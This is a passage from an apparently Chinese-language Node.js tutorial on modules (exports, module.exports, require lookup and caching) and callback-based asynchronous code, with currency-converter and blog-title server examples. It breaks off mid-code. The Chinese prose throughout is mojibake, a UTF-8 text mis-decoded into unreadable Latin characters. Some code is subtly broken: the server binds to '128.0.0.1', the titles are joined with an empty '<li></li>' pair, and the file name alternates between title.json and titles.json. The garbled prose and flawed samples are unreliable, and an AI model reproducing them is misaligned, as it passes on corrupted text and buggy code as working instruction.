æ¨¡å—å…è®¸ä»Žè¢«å¼•å…¥æ–‡ä»¶ä¸­é€‰æ‹©è¦æš´éœ²ç»™ç¨‹åºçš„å‡½æ•°å’Œå˜é‡ï¼Œå¦‚æžœæ¨¡å—è¿”å›žçš„å‡½æ•°æˆ–è€…å˜é‡ä¸æ­¢ä¸€ä¸ªï¼Œé‚£ä¹ˆå®ƒå¯ä»¥é€šè¿‡è®¾å®š exports å¯¹è±¡çš„å±žæ€§æ¥æŒ‡æ˜Žå®ƒä»¬ã€‚å¦‚æžœè¿™ä¸ªæ¨¡å—åªè¿”å›žä¸€ä¸ªå‡½æ•°æˆ–è€…å˜é‡ï¼Œåˆ™å¯ä»¥è®¾å®š module å±žæ€§ã€‚ Node æ¨¡å—ç³»ç»Ÿé¿å…äº†å¯¹å…¨å±€ä½œç”¨åŸŸçš„æ±¡æŸ“ï¼Œä»Žè€Œä¹Ÿå°±é¿å…äº†å‘½åå†²çªï¼Œå¹¶ç®€åŒ–äº†ä»£ç çš„é‡ç”¨ã€‚æ¨¡å—è¿˜å¯ä»¥å‘å¸ƒåˆ° npm å­˜å‚¨åº“ä¸­ã€‚ä½¿ç”¨çº¿ä¸Šè¿™äº›æ¨¡å—æ²¡æœ‰å¿…è¦æ‹…å¿ƒä¼šè¦†ç›–å…¶ä»–æ¨¡å—çš„å˜é‡å’Œå‡½æ•°ã€‚ ä¸‹é¢å°†ä¼šé€šè¿‡ä¸€ä¸ªå®žä¾‹æ¥è¯´æ˜ŽæŠŠé€»è¾‘ç»„ç»‡åˆ°æ¨¡å—ä¸­ï¼Œéœ€è¦æ³¨æ„çš„å‡ ä¸ªé—®é¢˜ï¼š å¦‚ä½•åˆ›å»ºæ¨¡å— æ¨¡å—æ”¾åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­çš„ä»€ä¹ˆåœ°æ–¹ åœ¨åˆ›å»ºå’Œä½¿ç”¨æ¨¡å—æ—¶è¦æ³¨æ„çš„ä¸œè¥¿ å¼€å§‹ä¸€ä¸ªæ–°çš„ Node é¡¹ç›®åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œåœ¨è¯¥ç›®å½•ä¸‹è¾“å…¥ 1npm init -y -y ä»£è¡¨ yesï¼Œè¿™æ · npm å°±ä¼šåˆ›å»ºä¸€ä¸ªå…¨éƒ¨ä½¿ç”¨é»˜è®¤å€¼çš„ package.json æ–‡ä»¶ã€‚å¦‚æžœæƒ³è¦æ›´å¤šçš„æŽ§åˆ¶æƒï¼Œåˆ™åŽ»æŽ‰ -yï¼Œå°±å¯ä»¥è‡ªå®šä¹‰ æŽˆæƒè®¸å¯ã€ä½œè€…åå­—ç­‰ç­‰â€¦ä¸è¿‡è¿™äº›éƒ½æ²¡æœ‰ä»€ä¹ˆå¿…è¦å§ï¼Œå› ä¸ºä½ ä¹Ÿå¯ä»¥æ‰‹åŠ¨å†åŽ»ä¿®æ”¹åˆå§‹åŒ–çš„ package.json æ–‡ä»¶ã€‚ åˆ›å»ºæ¨¡å—æ¨¡å—æ—¢å¯ä»¥æ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥æ˜¯åŒ…å«ä¸€ä¸ªæˆ–è€…å¤šä¸ªæ–‡ä»¶çš„ç›®å½•ã€‚å¦‚æžœæ¨¡å—æ˜¯ä¸€ä¸ªç›®å½•ï¼ŒNodeé€šå¸¸ä¼šåœ¨è¿™ä¸ªç›®å½•ä¸‹æ‰¾ä¸€ä¸ªå« index.jsçš„æ–‡ä»¶ä½œä¸ºæ¨¡å—çš„å…¥å£ã€‚å…¸åž‹çš„æ¨¡å—æ˜¯ä¸€ä¸ªåŒ…å« exports å¯¹è±¡å±žæ€§å®šä¹‰çš„æ–‡ä»¶ï¼Œè¿™äº›å±žæ€§å¯ä»¥æ˜¯ä»»æ„ç±»åž‹çš„æ•°æ®ï¼Œæ¯”å¦‚å­—ç¬¦ä¸²ã€å¯¹è±¡å’Œå‡½æ•°ã€‚ åˆ›å»ºä¸€ä¸ªæ¨¡å—ï¼Œæ¥è¿›è¡Œè´§å¸è½¬æ¢ã€‚ 12345678const canadianDollar = 0.91;function roundTwo(amount)&#123; return Math.round(amount * 100) / 100;&#125;// canadianToUS ä¸Ž USToCanadianå‡½æ•°è®¾å®šåœ¨ exports æ¨¡å—ä¸­ï¼Œæ‰€ä»¥å¼•å…¥è¿™ä¸ªæ¨¡å—çš„ä»£ç å¯ä»¥ä½¿ç”¨å®ƒä»¬exports.canadianToUS = canadian =&gt; roundTwo(canadian * canadianDollar);exports.USToCanadian = us =&gt; roundTwo(us / canadianDollar); exports å¯¹è±¡ä¸Šåªè®¾å®šäº†ä¸¤ä¸ªå±žæ€§ã€‚ä¹Ÿå°±æ˜¯è¯´å¼•å…¥è¿™ä¸ªæ¨¡å—çš„ä»£ç åªèƒ½è®¿é—®åˆ° canadianToUS ä¸Ž USToCanadianä¸¤ä¸ªå‡½æ•°ã€‚è€Œå˜é‡ canadianDollar ä½œä¸ºç§æœ‰å˜é‡ä»…ä½œç”¨åœ¨ è¿™ä¸¤ä¸ªå‡½æ•°çš„é€»è¾‘å†…éƒ¨ï¼Œç¨‹åºå¹¶ä¸èƒ½ç›´æŽ¥è®¿é—®å®ƒã€‚ ä½¿ç”¨è¿™ä¸ªæ¨¡å—è¦ç”¨åˆ° Node çš„ require å‡½æ•°ï¼Œè¯¥å‡½æ•°ä»¥æ‰€ç”¨æ¨¡å—çš„è·¯å¾„ä¸ºå‚æ•°ã€‚Node ä»¥åŒæ­¥çš„æ–¹å¼å¯»æ‰¾æ¨¡å—ï¼Œå®šä¹‰åˆ°è¿™ä¸ªæ¨¡å—å¹¶åŠ è½½æ–‡ä»¶ä¸­çš„å†…å®¹ã€‚Node æŸ¥æ‰¾æ–‡ä»¶çš„ é¡ºåºæ˜¯å…ˆæ‰¾åˆ°æ ¸å¿ƒæ¨¡å—ï¼Œç„¶åŽæ˜¯å½“å‰ç›®å½•ï¼Œæœ€åŽæ˜¯ node_modules å…³äºŽ require å’Œ åŒæ­¥I/O require æ˜¯ Node ä¸­å°‘æ•°å‡ ä¸ªåŒæ­¥ I/Oæ“ä½œä¹‹ä¸€ã€‚å› ä¸ºç»å¸¸ç”¨åˆ°æ¨¡å—ï¼Œå¹¶ä¸”ä¸€èˆ¬éƒ½æ˜¯åœ¨æ–‡ä»¶é¡¶ç«¯å¼•å…¥ï¼Œæ‰€ä»¥æŠŠ require åšæˆåŒæ­¥çš„æœ‰åŠ©äºŽä»£ç çš„æ•´æ´ã€æœ‰åºã€‚ ä½†åœ¨I/Oå¯†é›†çš„åœ°æ–¹å°½é‡ä¸è¦ç”¨ requireã€‚æ‰€æœ‰åŒæ­¥è°ƒç”¨éƒ½ä¼šé˜»å¡ž Node,çŸ¥é“è°ƒç”¨å®Œæˆæ‰èƒ½åšå…¶ä»–äº‹æƒ…ã€‚æ¯”å¦‚ä½ æ­£åœ¨è¿è¡Œä¸€ä¸ª HTTP æœåŠ¡å™¨ï¼Œå¦‚æžœåœ¨æ¯ä¸ªè¿›å…¥çš„è¯·æ±‚ä¸Šéƒ½ç”¨äº† requireï¼Œå°±ä¼šé‡åˆ°æ€§èƒ½é—®é¢˜ã€‚æ‰€ä»¥ require å’Œå…¶ä»–åŒæ­¥æ“ä½œé€šå¸¸æ”¾åœ¨æœ€åˆåŠ è½½çš„åœ°æ–¹ã€‚ ä¸‹é¢è¿™ä¸ªæ˜¯ test-currency.js ä¸­çš„ä»£ç ï¼Œå®ƒ require äº† currency.js æ¨¡å— 123456// è·¯å¾„ ./ ä»£è¡¨æ¨¡å—è·Ÿç¨‹åºè„šæœ¬æ”¾åœ¨åŒä¸€ä¸ªç›®å½•ä¸‹const currency = require('./currency');console.log('50 Canadian dollars equals this amount of US dollars:');console.log(currency.canadianToUS(50));console.log('30 US dollars equals this amount of Canadian dollars:');console.log(currency.USToCanadian(30)); å¼•å…¥æ—¶ï¼Œ.js æ‰©å±•åå¯ä»¥å¿½ç•¥ã€‚å¦‚æžœæ²¡æœ‰æŒ‡æ˜Žæ˜¯ jsæ–‡ä»¶ï¼ŒNodeä¹Ÿä¼šæ£€æŸ¥ json æ–‡ä»¶ï¼Œjson æ–‡ä»¶å°±æ˜¯ä½œä¸º JavaScript å¯¹è±¡åŠ è½½çš„ã€‚ åœ¨ Node å®šä½åˆ°å¹¶è®¡ç®—å¥½ä½ çš„æ¨¡å—ä¹‹åŽï¼Œ require å‡½æ•°ä¼šè¿”å›žè¿™ä¸ªæ¨¡å—ä¸­å®šä¹‰çš„ exports å¯¹è±¡ä¸­çš„å†…å®¹ï¼Œç„¶åŽä½ å°±å¯ä»¥ç”¨è¿™ä¸ªæ¨¡å—ä¸­çš„ä¸¤ä¸ªå‡½æ•°åšè´§å¸è½¬æ¢äº†ã€‚ å¦‚æžœæƒ³æŠŠè¿™ä¸ªæ¨¡å—æ”¾åœ¨å­ç›®å½•ï¼Œæ¯”å¦‚ â€™/libâ€˜ï¼Œåªè¦æŠŠ require è¯­å¥æ”¹æˆä¸‹é¢çš„å°±å¯ä»¥äº† 1const currency = require('./lib/currency'); ç»„è£…æ¨¡å—ä¸­çš„ exports å¯¹è±¡æ˜¯åœ¨å•ç‹¬çš„æ–‡ä»¶ä¸­ç»„ç»‡å¯é‡ç”¨ä»£ç çš„ä¸€ç§ç®€ä¾¿æ–¹æ³•ã€‚ ç”¨ module.exports å¾®è°ƒæ¨¡å—çš„åˆ›å»ºå°½ç®¡ç”¨å‡½æ•°å’Œå˜é‡ç»„è£… exports å¯¹è±¡èƒ½æ»¡è¶³å¤§å¤šæ•°çš„æ¨¡å—çš„éœ€è¦ï¼Œä½†æœ‰æ—¶ä½ å¯èƒ½éœ€è¦è°ƒç”¨ä¸åŒçš„æ¨¡åž‹æ¥åˆ›å»ºè¯¥æ¨¡å—ã€‚ æ¯”å¦‚è¯´ï¼Œå‰é¢åˆ›å»ºçš„é‚£ä¸ªè´§å¸è½¬æ¢å™¨æ¨¡å—å¯ä»¥æ”¹æˆåªè¿”å›žä¸€ä¸ª Currency æž„é€ å‡½æ•°ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªåŒ…å«ä¸¤ä¸ªå‡½æ•°çš„å¯¹è±¡ã€‚ä¸€ä¸ªé¢å‘å¯¹è±¡çš„å®žçŽ°çœ‹èµ·æ¥å¯èƒ½æƒ³ä¸‹é¢è¿™æ ·ï¼š 1234const Currency = require('./currency');const canadianDollar = 0.91;const currency = new Currency(canadianDollar);console.log(currency.canadianToUS); å¦‚æžœåªéœ€è¦ä»Žæ¨¡å—ä¸­å¾—åˆ°ä¸€ä¸ªå‡½æ•°ï¼Œé‚£ä»Ž require ä¸­è¿”å›žä¸€ä¸ªå‡½æ•°çš„ä»£ç è¦æ¯”è¿”å›žä¸€ä¸ªå¯¹è±¡çš„ä»£ç æ›´åŠ ä¼˜é›…ã€‚ è¦åˆ›å»ºä¸€ä¸ªå˜é‡æˆ–è€…å‡½æ•°çš„æ¨¡å—ï¼Œä½ å¯èƒ½ä¼šä»¥ä¸ºåªè¦æŠŠ exports è®¾å®šä½ æƒ³è¿”å›žçš„ä¸œè¥¿å°±è¡Œã€‚ä½†æ˜¯è¿™æ ·æ˜¯ä¸è¡Œçš„ï¼Œå› ä¸º Node è§‰å¾—ä¸ç”¨ä»»ä½•å…¶ä»–å¯¹è±¡ã€å‡½æ•°æˆ–è€…å˜é‡ç»™ exports èµ‹å€¼ã€‚ä¸‹é¢ä»£ç æ¸…å•ä¸­çš„æ¨¡å—ä»£ç è§†å›¾å°†ä¸€ä¸ªå‡½æ•°èµ‹å€¼ç»™ exports 12345678910111213141516// è¿™ä¸ªæ¨¡å—ä¸èƒ½ç”¨class Currency&#123; constructor(canadianDollar)&#123; this.canadianDollar = canadianDollar; &#125; roundTwoDecimals(amount)&#123; return Math.round(amount * 100) / 100; &#125; canadianToUS(canadian)&#123; return this.roundTwoDecimals(canadian * this.canadianDollar); &#125; USToCanadian(us)&#123; return this.roundTwoDecimals(us / this.canadianDollar); &#125;&#125;exports = Currency; // é”™è¯¯ï¼ŒNode ä¸å…è®¸é‡å†™ exports ä¸ºäº†è®©å‰é¢é‚£ä¸ªæ¨¡å—å¯ç”¨ï¼Œéœ€è¦æŠŠ exports æ¢æˆ module.exports ã€‚ç”¨ module.exports å¯ä»¥å¯¹å¤–æä¾›å•ä¸ªå˜é‡ã€å‡½æ•°æˆ–è€…å¯¹è±¡ã€‚å¦‚æžœä½ åˆ›å»ºäº†ä¸€ä¸ªæ—¢æœ‰ exports åˆæœ‰ module.exports çš„æ¨¡å—ã€‚é‚£ä¹ˆå®ƒä¼šè¿”å›ž module.exports ï¼Œè€Œ exports ä¼šè¢«å¿½ç•¥ã€‚ å¯¼å‡ºçš„ç©¶ç«Ÿæ˜¯ä»€ä¹ˆ æœ€ç»ˆåœ¨ç¨‹åºé‡Œå¯¼å‡ºçš„æ˜¯ module.exportsã€‚ exports åªæ˜¯å¯¹ module.exports çš„å…¨å±€å¼•ç”¨ï¼Œæœ€åˆè¢«å®šä¹‰ä¸ºä¸€ä¸ªå¯ä»¥æ·»åŠ å±žæ€§çš„ç©ºå¯¹è±¡ã€‚ exports.myFunc åªæ˜¯ module.exports.myFunc çš„ç®€å†™ã€‚ æ‰€ä»¥ï¼Œå¦‚æžœæŠŠ exports è®¾å®šä¸ºåˆ«çš„ï¼Œå°±æ‰“ç ´äº† module.exports ä¹‹é—´çš„å¼•ç”¨å…³ç³»ã€‚å¯æ˜¯å› ä¸ºçœŸæ­£å¯¼å‡ºçš„æ˜¯ module.exportsï¼Œé‚£æ · exports å°±ä¸èƒ½ç”¨äº†ï¼Œå› ä¸ºå®ƒä¸å†æŒ‡å‘ module.exports äº†ã€‚å¦‚æžœä½ æƒ³ä¿ç•™é‚£ä¸ªé“¾æŽ¥ï¼Œå¯ä»¥åƒä¸‹é¢è¿™æ ·è®© module.exports å†æ¬¡å¼•ç”¨ exports: 1module.exports = exports = Currency; æ ¹æ®éœ€è¦ä½¿ç”¨ exports æˆ– module.exports å¯ä»¥å°†åŠŸèƒ½ç»„ç»‡æˆæ¨¡å—ï¼Œè§„é¿å°†ç¨‹åºè„šæœ¬ä¸€ç›´å¢žé•¿æ‰€äº§ç”Ÿçš„å¼Šç«¯ã€‚ ç”¨ node_module é‡ç”¨æ¨¡å—è¦æ±‚æ¨¡å—åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­ä½¿ç”¨ç›¸å¯¹è·¯å¾„å­˜æ”¾ï¼Œå¯¹äºŽç»„ç»‡ç¨‹åºç‰¹å®šçš„ä»£ç å¾ˆæœ‰å¸®åŠ©ï¼Œä½†å¯¹äºŽæƒ³è¦åœ¨ç¨‹åºæˆ¿é—´å…±äº«æˆ–è·Ÿå…¶ä»–äººå…±äº«ä»£ç å´ç”¨å¤„ä¸å¤§ã€‚Node ä¸­æœ‰ä¸€ä¸ªç‹¬ç‰¹çš„å¼•ç”¨æœºåˆ¶ï¼Œå¯ä»¥ä¸å¿…çŸ¥é“æ¨¡å—åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­çš„å…·ä½“ä½ç½®ã€‚è¿™ä¸ªæœºåˆ¶å°±æ˜¯ä½¿ç”¨ node_modules ç›®å½•ã€‚ å¦‚æžœå¼•å…¥çš„æ—¶å€™çœç•¥æŽ‰è·¯å¾„ï¼Œç›´æŽ¥å†™æ–‡ä»¶åï¼ŒNode ä¼šéµç…§å‡ ä¸ªæŸœå­æœå¯»è¿™ä¸ªæ¨¡å— ç”¨çŽ¯å¢ƒå˜é‡ NODE_PATH å¯ä»¥æ”¹å˜ Node æ¨¡å—çš„é»˜è®¤è·¯å¾„ã€‚å¦‚æžœç”¨äº†å®ƒï¼Œåœ¨ Window ä¸­ NODE_PATH åº”è¯¥è®¾ç½®ä¸ºç”¨åˆ†å·åˆ†éš”çš„ç›®å½•åˆ—è¡¨ï¼Œåœ¨å…¶ä»–æ“ä½œç³»ç»Ÿä¸­åˆ™ç”¨å†’å·åˆ†éš”ã€‚ æ³¨æ„äº‹é¡¹å°½ç®¡Nodeæ¨¡å—ç³»ç»Ÿçš„æœ¬è´¨ç®€å•ç›´æŽ¥ï¼Œä½†æ˜¯æœ‰ä¸¤ç‚¹éœ€è¦æ³¨æ„ä¸€ä¸‹ã€‚ ç¬¬ä¸€ï¼Œå¦‚æžœæ¨¡å—æ˜¯ç›®å½•ï¼Œåœ¨æ¨¡å—ç›®å½•ä¸­å®šä¹‰æ¨¡å—çš„æ–‡ä»¶å¿…é¡»è¢«å‘½åä¸º index.js ï¼Œé™¤éžä½ åœ¨è¿™ä¸ªç›®å½•ä¸‹ä¸€ä¸ªå« package.json çš„æ–‡ä»¶é‡Œç‰¹åˆ«æŒ‡æ˜Žã€‚è¦æŒ‡å®šä¸€ä¸ªå–ä»£ index.js çš„æ–‡ä»¶ï¼Œpackage.json æ–‡ä»¶é‡Œå¿…é¡»æœ‰ä¸€ä¸ªç”¨ JavaScript å¯¹è±¡è¡¨ç¤ºæ³• ï¼ˆJSONï¼‰æ•°æ®å®šä¹‰çš„å¯¹è±¡ï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªåä¸º main çš„é”®ï¼ŒæŒ‡æ˜Žæ¨¡å—ç›®å½•å†…æ–‡ä»¶çš„è·¯å¾„ã€‚ä¸‹é¢çš„æµç¨‹å›¾å¯¹è¿™äº›è§„åˆ™åšäº†æ±‡æ€»ã€‚ ä¸‹é¢æ˜¯ä¸€ä¸ª package.json æ–‡ä»¶çš„ä¾‹å­ï¼Œå®ƒæŒ‡å®š currency.js ä¸ºä¸»æ–‡ä»¶ 123&#123; "main":"currency.js"&#125; ç¬¬äºŒï¼ŒNode èƒ½æŠŠæ¨¡å—ä½œä¸ºå¯¹è±¡ç¼“å­˜èµ·æ¥ï¼Œå¦‚æžœç¨‹åºä¸­çš„ä¸¤ä¸ªæ–‡ä»¶å¼•å…¥äº†ç›¸åŒçš„æ¨¡å—ï¼Œç¬¬ä¸€ä¸ª require ä¼šæŠŠæ¨¡å—è¿”å›žçš„æ•°æ®å­˜åˆ°å†…å®¹ä¸­ï¼Œè¿™æ ·ç¬¬äºŒä¸ª require åŠ ä¸ç”¨å†åŽ»è®¿é—®å’Œè®¡ç®—æ¨¡å—çš„æºæ–‡ä»¶äº†ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼ŒåŒä¸ªè¿›ç¨‹ä¸­ä½¿ç”¨ require åŠ è½½ä¸€ä¸ªæ¨¡å—å¾—åˆ°çš„æ˜¯ç›¸åŒçš„å¯¹è±¡ã€‚å‡è®¾ä½ æ­å»ºäº†ä¸€ä¸ª MVC Web ç¨‹åºï¼Œå®ƒæœ‰ä¸€ä¸ªä¸»å¯¹è±¡ appã€‚ä½ å¯ä»¥è®¾ç½®å¥½é‚£ä¸ª app å¯¹è±¡ï¼Œå¯¼å‡ºå®ƒï¼Œç„¶åŽåœ¨é¡¹ç›®ä¸­çš„ä»»ä½•åœ°æ–¹ require å®ƒã€‚å¦‚æžœä½ åœ¨è¿™ä¸ª app å¯¹è±¡ä¸­æ”¾äº†ä¸€äº›é…ç½®ä¿¡æ¯ï¼Œé‚£ä½ å°±å¯ä»¥åœ¨å…¶ä»–æ–‡ä»¶è®¿é—®è¿™äº›é…ç½®ä¿¡æ¯çš„å€¼ï¼Œå‡è®¾ç›®å½•æŽ¥å£å¦‚ä¸‹ï¼š 1234project --app.js --models --post.js ä¸‹é¢å±•ç¤ºå®ƒçš„å·¥ä½œåŽŸç† ä½¿ç”¨å¼‚æ­¥ç¼–ç¨‹æŠ€æœ¯æœåŠ¡ç«¯å¼‚æ­¥ç¼–ç¨‹ï¼šäº‹ä»¶ä¹Ÿä¼šè§¦å‘å“åº”é€»è¾‘ï¼Œåœ¨Node çš„ä¸–ç•Œæµè¡Œä¸¤ç§å“åº”é€»è¾‘ç®¡ç†æ–¹å¼ï¼Œå›žè°ƒå’Œäº‹ä»¶ç›‘å¬ã€‚ å›žè°ƒé€šå¸¸ç”¨æ¥å®šä¹‰ä¸€æ¬¡æ€§å“åº”çš„é€»è¾‘ï¼Œæ¯”å¦‚å¯¹äºŽæ•°æ®åº“æŸ¥è¯¢ï¼Œå¯ä»¥æŒ‡å®šä¸€ä¸ªå›žè°ƒå‡½æ•°æ¥ç¡®å®šå¦‚ä½•å¤„ç†æŸ¥è¯¢ç»“æžœã€‚è¿™ä¸ªå›žè°ƒå‡½æ•°å¯èƒ½ä¼šæ˜¾ç¤ºæ•°æ®åº“æŸ¥è¯¢ç»“æžœï¼Œæ ¹æ®è¿™äº›ç»“æžœæ¥åšäº›è®¡ç®—ï¼Œæˆ–è€…ä»¥æŸ¥è¯¢ç»“æžœä¸ºå‚æ•°æ‰§è¡Œå¦ä¸€ä¸ªå›žè°ƒå‡½æ•°ã€‚ äº‹ä»¶ç›‘å¬å™¨æœ¬è´¨ä¸Šä¹Ÿæ˜¯ä¸€ä¸ªå›žè°ƒï¼Œä¸åŒçš„æ˜¯ï¼Œå®ƒæ˜¯ä¸€ä¸ªæ¦‚å¿µå®žä½“ï¼ˆäº‹ä»¶ï¼‰ç›¸å…³è”ã€‚ä¾‹å¦‚ï¼Œå½“æœ‰äººåœ¨æµè§ˆå™¨ç‚¹å‡»é¼ æ ‡æ—¶ï¼Œé¼ æ ‡ç‚¹å‡»å°±æ˜¯ä¸€ä¸ªéœ€è¦å¤„ç†çš„äº‹ä»¶ã€‚åœ¨node ä¸­ï¼Œå½“æœ‰ HTTP è¯·æ±‚è¿‡æ¥æ—¶å€™ï¼ŒHTTPæœåŠ¡å™¨ä¼šå‘å‡ºä¸€ä¸ª request äº‹ä»¶ã€‚ä½ å¯ä»¥ç›‘å¬é‚£ä¸ª request äº‹ä»¶ï¼Œå¹¶æ·»åŠ ä¸€äº›å“åº”é€»è¾‘ã€‚åœ¨ä¸‹é¢çš„ä¾‹å­ä¸­ï¼Œç”¨ EventEmitter.prototype.on æ–¹æ³•åœ¨æœåŠ¡å™¨ä¸Šç»‘å®šäº†ä¸€ä¸ªç›‘å¬å™¨ï¼Œæ‰€ä»¥æ¯å½“æœ‰ request äº‹ä»¶å‘å‡ºæ—¶ï¼ŒæœåŠ¡å™¨å°±ä¼šè°ƒç”¨ hanldeRequest å‡½æ•°ï¼š 1server.on('request',handleRequest); ä¸€ä¸ª Node HTTP æœåŠ¡å™¨å®žä¾‹å°±æ˜¯ä¸€ä¸ªäº‹ä»¶å‘å°„å™¨ï¼Œä¸€ä¸ªå¯ä»¥ç»§æ‰¿ã€èƒ½å¤Ÿæ·»åŠ äº‹ä»¶å‘å°„åŠå¤„ç†èƒ½åŠ›çš„ç±»ï¼ˆEventEmitterï¼‰ã€‚Node çš„è®¸å¤šæ ¸å¿ƒåŠŸèƒ½éƒ½ç»§æ‰¿è‡ª EventEmitter ï¼Œä½ ä¹Ÿèƒ½åˆ›å»ºè‡ªå·±çš„äº‹ä»¶å‘å°„å™¨ã€‚ Node æœ‰ä¸¤ç§å¸¸ç”¨çš„å“åº”é€»è¾‘ç»„ç»‡æ–¹å¼ï¼Œæˆ‘ä»¬åˆšæ‰ç”¨äº†ä¸€ç§ï¼ŒæŽ¥ä¸‹æ¥è¦äº†è§£å®ƒçš„å·¥ä½œæœºåˆ¶ï¼š å¦‚ä½•ç”¨å›žè°ƒå¤„ç†ä¸€æ¬¡æ€§äº‹ä»¶ å¦‚ä½•ç”¨äº‹ä»¶ç›‘å¬å™¨å“åº”é‡å¤æ€§äº‹ä»¶ å¼‚æ­¥ç¼–ç¨‹çš„å‡ ä¸ªéš¾ç‚¹ ç”¨å›žè°ƒå¤„ç†ä¸€æ¬¡æ€§äº‹ä»¶å›žè°ƒæ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œå®ƒè¢«å½“åšå‚æ•°ä¼ ç»™å¼‚æ­¥å‡½æ•°ï¼Œç”¨æ¥æè¿°å¼‚æ­¥æ“ä½œå®Œæˆä¹‹åŽè¦åšä»€ä¹ˆã€‚å›žè°ƒå‡½æ•° åœ¨ Node å¼€å‘ä½¿ç”¨å¾—å¾ˆé¢‘ç¹ï¼Œæ¯”äº‹ä»¶å‘å°„å™¨ç”¨å¾—å¤šï¼Œå¹¶ä¸”ç”¨èµ·æ¥ä¹Ÿå¾ˆç®€å•ã€‚ ä¸ºäº†æ¼”ç¤ºå›žè°ƒçš„ç”¨æ³•ï¼Œæˆ‘ä»¬æ¥åšä¸€ä¸ªç®€å•çš„ HTTP æœåŠ¡å™¨ï¼Œè®©å®ƒå®žçŽ°ä»¥ä¸‹çš„åŠŸèƒ½ å¼‚æ­¥èŽ·å–å­˜åœ¨ JSON æ–‡ä»¶ä¸­çš„æ–‡ç« çš„æ ‡é¢˜ å¼‚æ­¥èŽ·å–ç®€å•çš„HTML æ¨¡å— æŠŠé‚£äº›æ ‡é¢˜ç»„è£…åˆ° HTML é¡µé¢ä¸­ æŠŠ HTML é¡µé¢å‘é€ç»™ç”¨æˆ· JSON æ–‡ä»¶ï¼ˆtitle.jsonï¼‰ä¼šè¢«æ ¼å¼åŒ–é™ˆç»™ä¸€ä¸ªåŒ…å«æ–‡ç« æ ‡é¢˜çš„å­—ç¬¦ä¸²æ•°ç»„ï¼Œå†…å®¹å¦‚ä¸‹ï¼š 12345[ "Kazakhstan is a huge country... what goes on there?", "This weather is making me craaazy", "My neighbor sort of howls at night"] HTML æ–‡ä»¶ template.html å¦‚ä¸‹ç»“æž„ï¼Œå¯ä»¥æ’å…¥åšå®¢æ–‡ç« çš„æ ‡é¢˜ 12345678910111213141516&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;meta http-equiv="X-UA-Compatible" content="ie=edge"&gt; &lt;title&gt;å›žè°ƒçš„ç”¨æ³•&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;Lates Posts&lt;/h1&gt; &lt;!-- %ä¼šè¢«æ›¿æ¢ --&gt; &lt;ul&gt; &lt;li&gt;%&lt;/li&gt; &lt;/ul&gt;&lt;/body&gt;&lt;/html&gt; èŽ·å– JSON æ–‡ä»¶ä¸­çš„æ ‡é¢˜å¹¶æ¸²æŸ“ Web é¡µé¢çš„ä»£ç å¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425262728293031// blog_recent.jsconst http = require('http');const fs = require('fs');// åˆ›å»º HTTP æœåŠ¡å™¨å¹¶è°ƒç”¨å›žè°ƒå®šä¹‰å“åº”é€»è¾‘http.createServer((req,res) =&gt;&#123; if(req.url == '/')&#123; // è¯»å– JSON æ–‡ä»¶å¹¶è°ƒå®šä¹‰å¦‚ä½•å¤„ç†å…¶ä¸­çš„å†…å®¹ fs.readFile('./title.json',(err,data) =&gt;&#123; if(err)&#123; console.log(err); res.end('Server Error'); &#125;else&#123; const titles = JSON.parse(data.toString()); // è¯»å– HTML æ¨¡å—ï¼Œå¹¶åœ¨åŠ è½½å®ŒæˆåŽä½¿ç”¨å›žè°ƒ fs.readFile('./template.html',(err,data) =&gt;&#123; if(err)&#123; console.log(err); res.end('Server Error'); &#125;else&#123; // ç»„è£… HTML é¡µé¢ä»¥æ˜¾ç¤ºåšå®¢æ ‡é¢˜ const tmpl = data.toString(); const html = tmpl.replace('%',titles.join('&lt;li&gt;&lt;/li&gt;')); res.writeHead(200,&#123; 'Content-Type':'text/html' &#125;); // å°† HTML é¡µé¢å‘é€ç»™ç”¨æˆ· res.end(html); &#125; &#125;); &#125; &#125;); &#125;&#125;); è¿™è¿™ä¸ªä¾‹å­ä¸­ï¼ŒåµŒå¥—äº†ä¸‰å±‚ 123http.createServer((req, res) =&gt; &#123; ... fs.readFile('./titles.json', (err, data) =&gt; &#123; ... fs.readFile('./template.html', (err, data) =&gt; &#123; ... ä¸‰å±‚è¿˜å¯ä»¥ï¼Œä½†æ˜¯è°ƒç”¨å±‚æ•°è¶Šå¤šï¼Œä»£ç çœ‹èµ·æ¥è¶Šä¹±ï¼Œé‡æž„å’Œæµ‹è¯•èµ·æ¥ä¹Ÿå¾ˆå›°éš¾ï¼Œæ‰€ä»¥æœ€å¥½é™åˆ¶ä¸€ä¸‹å›žè°ƒçš„åµŒå¥—å±‚çº§ã€‚å¦‚æžœæŠŠæ¯ä¸€å±‚å›žè°ƒåµŒå¥—çš„å¤„ç†åšæˆå‘½åå‡½æ•°ï¼Œè™½ç„¶è¡¨ç¤ºç›¸åŒé€»è¾‘æ‰€ç”¨çš„ä»£ç å˜å¤šäº†ï¼Œä½†ç»´æŠ¤ã€æµ‹è¯•å’Œé‡æž„èµ·æ¥ä¼šè·Ÿæ›´å®¹æ˜“ã€‚ä¸‹é¢ä»£ç åˆ›å»ºäº†ä¸­é—´å‡½æ•°æ¥å‡å°‘åµŒå¥— 123456789101112131415161718192021222324252627282930313233343536373839404142const http = require('http');const fs = require('fs');// å®¢æˆ·ç«¯è¯·æ±‚ä¸€å¼€å§‹ä¼šè¿›å…¥åˆ°è¿™é‡Œhttp.createServer((req, res) =&gt; &#123; // æŽ§åˆ¶æƒäº¤ç»™äº† getTitles getTitles(res);&#125;).listen(8000, '128.0.0.1');// èŽ·å–æ ‡é¢˜ï¼Œå¹¶å°†æŽ§åˆ¶æƒè½¬äº¤ç»™ getTemplatefunction getTitles(res) &#123; fs.readFile('./title.json', (err, data) =&gt; &#123; if (err) &#123; hadError(err, res); &#125; else &#123; getTemplate(JSON.parse(data.toString()), res); &#125; &#125;);&#125;// 